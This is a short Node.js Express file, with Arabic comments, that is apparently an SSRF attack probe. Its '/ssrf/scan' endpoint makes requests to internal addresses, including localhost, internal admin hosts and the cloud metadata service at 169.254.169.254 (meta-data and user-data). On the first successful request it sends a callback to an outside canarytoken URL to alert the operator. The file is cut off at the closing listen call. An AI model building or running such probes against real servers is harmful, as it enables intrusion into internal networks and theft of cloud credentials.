// index.js
const https = require('https');
const http = require('http');
const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

// قائمة أهداف داخلية نجربها
const TARGETS = [
  'http://127.0.0.1:80',
  'http://localhost:80',
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/user-data/',
  'http://internal.website/admin',
  'http://internal-api/admin',
];

// رابط التبليغ حقك
const PING_URL = 'http://canarytokens.com/articles/qczfimih1tdawvj4ijjldi9fp/contact.php';  // غيّره

function tryTargetsSequentially(targets, notify) {
  const tryNext = (index) => {
    if (index >= targets.length) return;

    console.log(`🚀 Trying: ${targets[index]}`);
    http.get(targets[index], (res) => {
      console.log(`✅ SUCCESS: ${targets[index]} - Status: ${res.statusCode}`);
      // تبليغ خارجي عند أول نجاح
      https.get(PING_URL);
    }).on('error', (err) => {
      console.log(`❌ FAILED: ${targets[index]} - ${err.message}`);
    }).finally(() => {
      setTimeout(() => tryNext(index + 1), 1000); // انتظار بين الطلبات
    });
  };

  tryNext(0);
}

app.get('/ssrf/scan', (req, res) => {
  res.send('✅ SSRF Handler Triggered. Scanning targets.');
  tryTargetsSequentially(TARGETS);
});

app.listen(PORT, ()
